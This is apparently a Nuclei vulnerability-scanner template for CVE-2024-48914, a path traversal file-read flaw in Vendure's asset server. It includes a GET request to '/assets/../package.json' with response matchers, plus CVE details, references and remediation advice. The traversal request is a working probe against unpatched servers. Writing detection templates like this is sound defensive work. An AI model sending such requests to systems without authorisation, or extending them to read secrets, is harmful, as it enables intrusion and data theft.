http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "name", "version", "main" ,"license")
    - contains(content_type, "application/octet-stream")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/assets/../package.json'
id: CVE-2024-48914
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-48914
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 9.1
    cwe-id: CWE-20
    epss-percentile: 0.99713
    epss-score: 0.92383
  description: 'Vendure is an open-source headless commerce platform. Prior to versions
    3.0.5 and 2.3.3, a vulnerability in Vendure''s asset server plugin allows an attacker
    to craft a request which is able to traverse the server file system and retrieve
    the contents of arbitrary files, including sensitive data such as configuration
    files, environment variables, and other critical data stored on the server. In
    the same code path is an additional vector for crashing the server via a malformed
    URI.

    '
  impact: 'Allows attackers to read arbitrary files on the server, including sensitive
    data such as configuration files and environment variables.

    '
  metadata:
    fofa-query: Vendure
    max-request: 1
    product: vendure
    vendor: vendure-ecommerce
    verified: true
  name: Vendure - Arbitrary File Read
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-48914
  - https://github.com/EQSTLab/CVE-2024-48914
  - https://github.com/vendure-ecommerce/vendure
  - https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358
  - https://github.com/vendure-ecommerce/vendure/commit/e2ee0c43159b3d13b51b78654481094fdd4850c5
  remediation: 'Patches are available in versions 3.0.5 and 2.3.3. Some workarounds
    are also available. One may use object storage rather than the local file system,
    e.g. MinIO or S3, or define middleware which detects and blocks requests with
    urls containing `/../`.

    '
  severity: critical
  tags: cve,cve2024,vendure,lfi,file-read,vkev,vuln
